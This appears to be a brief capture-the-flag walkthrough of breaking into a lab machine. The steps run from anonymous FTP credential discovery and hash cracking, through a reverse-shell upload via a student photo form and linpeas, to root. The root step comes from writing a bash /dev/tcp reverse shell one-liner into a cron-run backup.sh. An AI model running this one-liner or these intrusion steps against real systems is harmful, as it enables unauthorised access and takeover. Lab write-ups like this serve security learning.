First I run nmap:

![](attachment/b4da621cb3ede4c57c9b431298c4b587.png)

and I found a note.txt file on the ftp server with anonymous login

  

then I searched for subdirectories

![](attachment/f7053b98125d0806d99e92a92f8e916d.png)

I found two login pages:

![](attachment/2ce1d91eeb4d6e5ad4e89e0dd6533a6a.png)

![](attachment/f3f726593c59336d7ef838ec94399b58.png)

then I got back to get the note.txt file

![](attachment/3877a603030a59babe48409d3ea2a48b.png)

and found some users with there passwords

![](attachment/485934ab65d8937ca0f8f4ecdd41619e.png)

and I cracked the hash:

![](attachment/1dbeb369a6cc4fcdfaae0cacf2eadea7.png)

then I logged in with the credential in the note.txt file with **reg** number and **student** password

and when I logged in it asked to change the password so I changed it to **syudent1**

then I found this page and it has upload file option so I uploaded a reverse shell

![](attachment/d55daecadf380823d601db0eb0ba432e.png)

then I right click on the student photo to open the directory of the photo

![](attachment/ae6f7efbfab52815b6801018db039add.png)

then I got linpeas on the machine and run it

![](attachment/b6b082b82abcd0a7923732f6bcea1f69.png)

and found some info

![](attachment/c880122413584dbeb7a1dae51196c223.png)

then I tried to connect with these credentials via ssh

and I got a shell:

![](attachment/2e9b889425e70294e53a0e3f9b2fda21.png)

and I found a vulnerability in /home/grimmie/backup.sh

![](attachment/85c295c2b289e40ed00ddda75aa7d18c.png)

then I searched on google for bash reverse shell one liner and I found:

![](attachment/580bd62d2f59313fed82a2e9f1b9bbfb.png)

then I modified the [backup.sh](http://backup.sh) file with this line

```Lua
bash -i >& /dev/tcp/192.168.133.139/7777 0>&1
```

![](attachment/57a619cebd3b0ca0db014a6b0bfa9c1f.png)

and I was set a netcat listener on my attacker machine waiting for the jop to execute and I got root!!!!!

![](attachment/8097389c0ed33abb08bf28253f03f540.png)